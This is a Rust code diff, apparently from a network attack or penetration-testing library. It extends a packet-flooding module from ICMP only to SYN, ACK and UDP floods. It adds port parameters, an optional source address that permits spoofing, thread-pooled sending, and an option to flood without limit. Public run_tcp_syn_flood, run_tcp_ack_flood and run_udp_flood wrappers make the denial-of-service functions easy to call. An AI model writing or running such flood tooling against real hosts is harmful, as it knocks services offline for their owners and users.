@@ -18,16 +18,22 @@ pub const IP_TTL: u8 = 64;
 
 pub enum FloodMethods {
     Icmp,
+    Syn,
+    Ack,
+    Udp,
 }
 
 pub fn _run_flood(
     method: FloodMethods,
     src_ipv4: Option<Ipv4Addr>,
+    src_port: Option<u16>,
     dst_ipv4: Ipv4Addr,
+    dst_port: Option<u16>,
     interface: Option<&str>,
     threads_num: usize,
     print_result: bool,
-    max_packet_num: usize,
+    max_same_packet: usize,
+    max_flood_packet: usize,
 ) -> Result<()> {
     let src_ipv4 = if src_ipv4.is_none() {
         let (_, src_ipv4, _) = utils::parse_interface(interface)?;
@@ -36,20 +42,36 @@ pub fn _run_flood(
         src_ipv4.unwrap()
     };
 
+    let src_port = if src_port.is_none() {
+        utils::random_port()
+    } else {
+        src_port.unwrap()
+    };
+
+    let dst_port = if dst_port.is_none() {
+        utils::random_port()
+    } else {
+        dst_port.unwrap()
+    };
+
     let func = match method {
         FloodMethods::Icmp => icmp::send_icmp_flood_packet,
+        FloodMethods::Syn => tcp::send_syn_flood_packet,
+        FloodMethods::Ack => tcp::send_ack_flood_packet,
+        FloodMethods::Udp => udp::send_udp_flood_packet,
     };
 
     let pool = utils::get_threads_pool(threads_num);
-    if max_packet_num > 0 {
-        for loop_num in 0..max_packet_num {
+
+    if max_flood_packet > 0 {
+        for loop_num in 0..max_flood_packet {
             if print_result {
                 if loop_num % 10000 == 0 {
                     println!("send {loop_num} packet");
                 }
             }
             pool.execute(move || {
-                let _ = func(src_ipv4, dst_ipv4);
+                let _ = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet);
             });
         }
     } else {
@@ -62,7 +84,7 @@ pub fn _run_flood(
                 }
             }
             pool.execute(move || {
-                let _ = func(src_ipv4, dst_ipv4);
+                let _ = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet);
             });
         }
     }
@@ -76,15 +98,94 @@ pub fn run_icmp_flood(
     interface: Option<&str>,
     threads_num: usize,
     print_result: bool,
-    max_packet_num: usize,
+    max_same_packet: usize,
+    max_flood_packet: usize,
 ) -> Result<()> {
     _run_flood(
         FloodMethods::Icmp,
         src_ipv4,
+        Some(0),
         dst_ipv4,
+        Some(0),
         interface,
         threads_num,
         print_result,
-        max_packet_num,
+        max_same_packet,
+        max_flood_packet,
+    )
+}
+
+pub fn run_tcp_syn_flood(
+    src_ipv4: Option<Ipv4Addr>,
+    src_port: Option<u16>,
+    dst_ipv4: Ipv4Addr,
+    dst_port: Option<u16>,
+    interface: Option<&str>,
+    threads_num: usize,
+    print_result: bool,
+    max_same_packet: usize,
+    max_flood_packet: usize,
+) -> Result<()> {
+    _run_flood(
+        FloodMethods::Syn,
+        src_ipv4,
+        src_port,
+        dst_ipv4,
+        dst_port,
+        interface,
+        threads_num,
+        print_result,
+        max_same_packet,
+        max_flood_packet,
+    )
+}
+
+pub fn run_tcp_ack_flood(
+    src_ipv4: Option<Ipv4Addr>,
+    src_port: Option<u16>,
+    dst_ipv4: Ipv4Addr,
+    dst_port: Option<u16>,
+    interface: Option<&str>,
+    threads_num: usize,
+    print_result: bool,
+    max_same_packet: usize,
+    max_flood_packet: usize,
+) -> Result<()> {
+    _run_flood(
+        FloodMethods::Ack,
+        src_ipv4,
+        src_port,
+        dst_ipv4,
+        dst_port,
+        interface,
+        threads_num,
+        print_result,
+        max_same_packet,
+        max_flood_packet,
+    )
+}
+
+pub fn run_udp_flood(
+    src_ipv4: Option<Ipv4Addr>,
+    src_port: Option<u16>,
+    dst_ipv4: Ipv4Addr,
+    dst_port: Option<u16>,
+    interface: Option<&str>,
+    threads_num: usize,
+    print_result: bool,
+    max_same_packet: usize,
+    max_flood_packet: usize,
+) -> Result<()> {
+    _run_flood(
+        FloodMethods::Udp,
+        src_ipv4,
+        src_port,
+        dst_ipv4,
+        dst_port,
+        interface,
+        threads_num,
+        print_result,
+        max_same_packet,
+        max_flood_packet,
     )
 }
